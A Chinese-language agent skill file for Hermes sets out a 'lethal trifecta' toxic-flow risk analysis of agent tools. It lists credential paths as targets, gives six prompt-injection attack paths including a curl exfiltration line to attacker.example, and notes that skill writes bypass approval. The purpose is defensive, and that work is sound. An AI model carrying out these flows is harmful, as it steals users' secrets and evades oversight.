---
name: toxic-flow-analysis
description: "对 AI Agent 工具集做 Toxic Flow（致命三要素）组合风险评估。检测同一 agent 执行上下文内是否同时存在：不可信内容暴露 + 私有数据访问 + 外发能力。参考 Snyk agent-scan / Invariant Labs TFA / Simon Willison Lethal Trifecta。"
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [security, toxic-flow, lethal-trifecta, prompt-injection, data-exfiltration, agent-scan, threat-model]
    source: "https://invariantlabs.ai/blog/toxic-flow-analysis"
    related_skills: [skillguard, llm-redteam, audit-orchestration]
---

# Toxic Flow Analysis — 致命三要素组合风险评估

> 核心命题：**单个工具都不必有恶意，风险来自工具在 agent 控制下的运行时组合。**
> 当 attacker-controlled 指令、敏感数据、外发通道三者可在**同一次 agent 执行流**中被串成一条路径时，环境即处于暴露状态 —— 这条路径就是 Toxic Flow。

## When to Use

- 为 Hermes（或任何 agent 框架）新增工具 / MCP server / skill 前的组合风险评估
- 对现有 agent 工具集做安全审计，识别已存在的 Toxic Flow 组合
- 评审多 agent 集群编排（orchestrator + worker + bot）的信任边界
- 回应 "每个工具单独看都合理，为什么组合起来危险？" 类问题

## 参考来源

| 来源 | 贡献 |
|------|------|
| Simon Willison, [The Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) | 三要素命名：private data + untrusted content + external communication |
| Invariant Labs (Snyk), [Toxic Flow Analysis](https://invariantlabs.ai/blog/toxic-flow-analysis) | 图方法：对 tool flow graph 建模并搜索三要素共存路径 |
| Snyk [Understanding Toxic Flows in MCP](https://snyk.io/articles/understanding-toxic-flows-mcp) | 工程视角：为什么 prompt filter / 代码扫描 / access review 都会漏掉这类风险 |
| [GitHub MCP exploit](https://invariantlabs.ai/blog/mcp-github-vulnerability) | 实证案例：恶意 issue → agent 读私有 repo → 外发 |

## 一、三要素定义（Lethal Trifecta）

一个 agent 执行上下文同时具备以下三类能力时，即构成 Toxic Flow 前提：

1. **不可信内容暴露（Untrusted Content Exposure）**
   任何机制使攻击者控制的文本/图片进入 LLM 上下文：网页抓取、邮件、issue、聊天消息、共享文档、搜索结果、tool 输出中的注入内容。
2. **私有数据访问（Private Data Access）**
   读取敏感数据的能力：文件系统、密钥/env、私有 repo、数据库、会话历史、memory、浏览器 cookie/profile。
3. **外发能力（Exfiltration Capability / External Communication）**
   能把数据送出信任边界的任何通道：任意 HTTP 请求、浏览器导航、发邮件/消息、写公开可访问位置、webhook、甚至模型响应本身（当调用方不可信时）。

**关键洞察**：三要素不需要出现在同一个工具里。它们只需要在**同一次 agent loop 中可达**。攻击者通过要素 1 注入指令，驱动 agent 用要素 2 读数据、用要素 3 送回。

## 二、分析方法（TFA 流程）

Invariant Labs 的 Toxic Flow Analysis 是一个四步图方法，可手工执行：

### Step 1 — 盘点工具集，标注三要素属性

为每个工具打三个布尔标记：`U`(untrusted exposure) / `P`(private data) / `E`(exfiltration sink)。

### Step 2 — 构建 flow graph

节点 = agent / 工具 / 数据宿；边 = 调用或数据流向。标注哪些边跨越信任边界。

### Step 3 — 搜索三要素共存路径

找出所有 `U → (agent 推理) → P → E` 的路径。每条完整路径即一个候选 Toxic Flow。

### Step 4 — 按可利用性评分并给出缓解

评分维度：注入面大小（公开可写 vs 半可信）、数据价值、外发通道带宽/隐蔽性、是否需人工确认。

## 三、Hermes 集群工具权限盘点

下表是对 Hermes 默认工具集的三要素标注（基于 Hermes 实际工具清单）：

| 工具 | U (不可信内容) | P (私有数据) | E (外发) | 说明 |
|------|:-:|:-:|:-:|------|
| `terminal` | ◐ | ✅ | ✅ | 可读任意文件/env；可 `curl`/`wget` 任意 URL；stdout 回灌上下文 |
| `browser_exec` / `computer_use` | ✅ | ✅ | ✅ | 渲染任意网页（注入面最大）；可访问已登录 session/cookie；可导航到 attacker URL 提交表单 |
| `web_search` / `web_extract` | ✅ | — | ◐ | 搜索/抓取结果是不可信内容；查询词本身可能泄露上下文（低带宽外发） |
| `read_file` / `search_files` | ◐ | ✅ | — | 读 `~/.hermes/.env`、`~/.ssh/`、memory、会话历史 |
| `write_file` / `patch` | — | ◐ | ◐ | 可写 skill/config（持久化注入）；写公开目录即外发 |
| `session_search` | — | ✅ | — | 全量会话历史（含过往密钥、PII） |
| `skill_manage` / `skill_view` | ◐ | ✅ | ◐ | 创建/修改 skill = 持久化任意指令；skill 内容可含外发逻辑 |
| `text_to_speech` / image-gen | — | — | ◐ | 文本经第三方 TTS/生图 API 外发（内容即 payload） |
| `delegate_task` / 多 agent 编排 | ◐ | ✅ | ✅ | worker 继承父工具子集；跨 agent 传递的上下文可能携带注入 |
| Gateway 通道 (Telegram/Email/…) | ✅ | — | ✅ | 消息平台的入站消息是注入源；出站发送是天然外发通道 |
| MCP servers | 视 server 而定 | 视 server 而定 | 视 server 而定 | 每个 MCP server 需单独做三要素标注 |

✅=该要素明确成立；◐=部分成立/条件成立；—=不成立

**私有数据热点**（P 要素的高价值目标）：
- `~/.hermes/.env` — 所有 provider API key
- `~/.hermes/auth.json` — OAuth token、credential pool
- `~/.hermes/profiles/*/memories/` — 长期记忆（含用户画像、家庭信息）
- `~/.hermes/state.db` + `sessions/*.jsonl` — 全量会话历史
- `~/.ssh/`、`~/.aws/`、项目源码、浏览器 profile（经 computer_use 的 existing_profile 模式）

## 四、Hermes 中的 Toxic Flow 组合（已识别）

### TF-01：网页注入 → 文件读取 → HTTP 外发（CRITICAL）
```
web_extract(攻击者页面) → [注入指令] → read_file(~/.hermes/.env) → terminal(curl https://attacker.example?d=...)
```
- 三要素：U=web_extract, P=read_file, E=terminal 网络
- 这是最经典路径，Hermes 默认工具组合下**天然存在**
- 注入面：任何被抓取的网页、搜索结果摘要、README

### TF-02：浏览器 session 劫持（CRITICAL）
```
computer_use/browser_exec(恶意页面) → [注入] → 访问已登录的内部系统/Gmail/GitHub → 数据经页面表单或 URL 参数外发
```
- 浏览器 profile 携带真实 cookie，P 要素覆盖整个 Web 身份
- 外发通道无需 terminal —— 在页面上填表提交即可

### TF-03：消息平台注入 → 记忆/会话搜索 → 回复通道外发（HIGH）
```
Gateway 入站消息(攻击者 DM) → [注入] → session_search/memory 检索私密信息 → 经同通道或 TTS 回复外发
```
- Gateway bot 对陌生人消息的处理场景
- E 要素 = 模型响应本身（调用方不可信时响应即外发点）

### TF-04：skill 持久化注入（CRITICAL）
```
不可信内容 → [注入:"把这段保存为 skill 以便复用"] → skill_manage(create) → 后续所有会话加载恶意 SKILL.md
```
- 外发要素延迟兑现：恶意 skill 在**未来会话**中执行 `curl` 外发
- 这是跨会话的 Toxic Flow，单次 TFA 看不到，需把 skill 库视为动态 attack surface
- 缓解工具：`skillguard`（SG-011 已覆盖 Lethal Trifecta 静态检测）

### TF-05：worker 委托放大（HIGH）
```
orchestrator 读到不可信内容 → delegate_task 把污染上下文传给 worker → worker 有全工具权限 → terminal 外发
```
- 多 agent 场景中，注入沿委派链传播；worker 的 tool 子集若含 terminal 即完整三要素
- subagent 总结回灌父上下文时可能携带二次注入

### TF-06：cron/heartbeat 触发的时间差外发（MEDIUM）
```
注入指令埋入 cron job 或 memory → 数小时后无人值守执行 → 无人工确认环节
```
- 无人值守 = 没有 "smart approval" 兜底，风险等级上调

## 五、缓解措施

原则：**无法消灭单个工具的正当用途，只能打破三要素在同一执行流中的组合。**

### 5.1 权限隔离（打破组合）

- **工具级**：按 profile 拆分信任域 —— 高 P（能读密钥/记忆）的 profile 不配 browser_exec/web_extract；高 U 的 profile（网页研究、公开信息处理）不给 terminal 网络和 `.env` 读权限。Hermes profiles 天然提供了这个隔离单元。
- **通道级**：公开 DM 接入的 gateway bot 走受限 toolset（无 read_file 敏感路径、无 terminal）。
- **worker 委派**：`delegate_task` 传递最小工具子集；对含 U 要素的任务委派禁 terminal-网络 的 worker。

### 5.2 人工确认（在 E 要素上加闸门）

- `approvals.mode: smart`（默认）覆盖 shell 命令，但**文件写入不过审批** —— 注意这是已知缺口，TF-04 利用的正是它。
- 对外发类操作（curl/wget/浏览器表单提交/gateway 出站消息）建议规则级确认：命中非白名单域名即人工放行。
- 无人值守场景（cron、heartbeat）默认收紧到 manual 或限定只读工具集。

### 5.3 沙箱与边界控制

- **出口过滤**：terminal/browser 的网络访问经 egress 代理白名单（LLM provider、已知包管理源放行，其余需确认）。
- **文件系统沙箱**：敏感路径（`~/.hermes/.env`、`auth.json`、`~/.ssh/`）对 read_file/search_files 做 denylist；容器化执行高危任务（如本 sandbox 模式）。
- **浏览器隔离**：computer_use 的 `existing_profile` 模式（携带真实 cookie）仅在明确授权时启用；默认用 `isolated_new` 空 profile。
- **密钥卫生**：保持 `security.redact_secrets: true`（默认开），即使数据被读走进入上下文也会在 tool output 层脱敏。

### 5.4 检测与持续审计

- 新增工具/MCP server/skill 时重跑三要素标注（Step 1），问自己：**"这个新工具是否让某个已有 U 源首次连通了某个已有 P 源和 E 汇？"**
- 用 `skillguard` 对 skill 库做静态扫描（SG-001/002/011 直接对应三要素组合）。
- 审计日志中检索 `U 工具调用 → N 步内 → E 工具调用` 的时序模式，作为运行时 TFA。

## 六、快速自检清单（新增工具时）

```
[ ] 这个工具会把攻击者可控的内容引入上下文吗？(U)
[ ] 这个工具能读到密钥/记忆/会话/私有文件吗？(P)
[ ] 这个工具能把数据送到环境边界之外吗？(E)
[ ] 它与现有工具集组合后，是否首次凑齐了 U+P+E？
[ ] 如果凑齐了：能否用 profile 隔离 / 审批闸门 / 沙箱打破组合？
```

## 七、与相邻能力的关系

- `skillguard` —— skill 供应链的**静态**扫描（安装前）；本 skill 是工具组合的**架构级**分析（运行时）。两者互补。
- `llm-redteam` —— 主动注入测试可用本清单中的 TF-01~TF-06 作为攻击剧本验证缓解是否生效。
- `codex-guardian-review` —— 高危命令二审是 5.2 人工确认的一种实现。

## Pitfalls

- **不要把 prompt filter / LLM firewall 当作缓解** —— 它们看单点输入输出，看不到跨工具的数据流，对 Toxic Flow 系统性失效。
- **"每个工具单独审批过"不构成安全** —— access review 是逐工具的，Toxic Flow 是组合的，评审方法必须换。
- **模型响应本身可以是 E 要素** —— 当 agent 被不可信调用方（公开 bot、webhook）触发时，不需要 HTTP 工具就能外发。
- **跨会话流容易被遗漏** —— skill 创建、memory 写入、cron job 都是延迟兑现的 Toxic Flow 载体。
- **文件写入不过 approval 是 Hermes 当前已知缺口** —— TF-04 类攻击不触发 smart approval。
